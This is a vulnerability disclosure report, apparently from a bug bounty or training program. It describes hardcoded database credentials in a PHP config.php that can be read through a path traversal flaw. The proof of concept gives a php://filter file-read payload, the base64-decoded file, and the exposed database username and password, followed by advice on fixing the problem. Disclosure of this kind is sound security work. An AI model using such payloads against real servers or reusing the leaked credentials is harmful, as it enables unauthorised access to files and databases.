# Description  
I have identified a Harcoded password vulnerability in the config.php.
A remote attacker could exploit it via the Path transversal vulnerability (report #YWH-PGM14549-85), in order to read the config.php and get database credentials.

# Exploitation  
By exploring the source code of the application, I saw that ```index.php``` included a ```config.php``` file, which seems juicy.

# PoC  
By using the following payload, I could get the database credentials:
```
/index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php
```
```
echo 'PD9waHAKJGhvc3QgPSAnZGInOwokZGIgICA9ICdteV9hc3NvY2lhdGlvbl9kYic7CiR1c2VyID0gJ2VQM1BXekpqJzsKJHBhc3MgPSAndmdUV01vSjInOwokY2hhcnNldCA9ICd1dGY4bWI0JzsKCiRkc24gPSAibXlzcWw6aG9zdD0kaG9zdDtkYm5hbWU9JGRiO2NoYXJzZXQ9JGNoYXJzZXQiOwokb3B0aW9ucyA9IFsKICAgIFBETzo6QVRUUl9FUlJNT0RFICAgICAgICAgICAgPT4gUERPOjpFUlJNT0RFX0VYQ0VQVElPTiwKICAgIFBETzo6QVRUUl9ERUZBVUxUX0ZFVENIX01PREUgPT4gUERPOjpGRVRDSF9BU1NPQywKICAgIFBETzo6QVRUUl9FTVVMQVRFX1BSRVBBUkVTICAgPT4gZmFsc2UsCl07Cgp0cnkgewogICAgJHBkbyA9IG5ldyBQRE8oJGRzbiwgJHVzZXIsICRwYXNzLCAkb3B0aW9ucyk7Cn0gY2F0Y2ggKFxQRE9FeGNlcHRpb24gJGUpIHsKICAgIHRocm93IG5ldyBcUERPRXhjZXB0aW9uKCRlLT5nZXRNZXNzYWdlKCksIChpbnQpJGUtPmdldENvZGUoKSk7Cn0KPz4K' | base64 -d
<?php
$host = 'db';
$db   = 'my_association_db';
$user = 'eP3PWzJj';
$pass = 'vgTWMoJ2';
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
    throw new \PDOException($e->getMessage(), (int)$e->getCode());
}
?>
```
You can see this critical information : 
```
$user = 'eP3PWzJj';
$pass = 'vgTWMoJ2';
```

# Risk
An attacker who gains access to this file could get all the needed information to connect to the database and perform malicious actions.

# Remediation  
Remove all hardcoded passwords from the source code. Store them securely using configuration files outside the web root with restricted permissions, or a secrets' management solution. Rotate any exposed credentials immediately.
# Author
EPSIMontpellier-LosPoulatchos
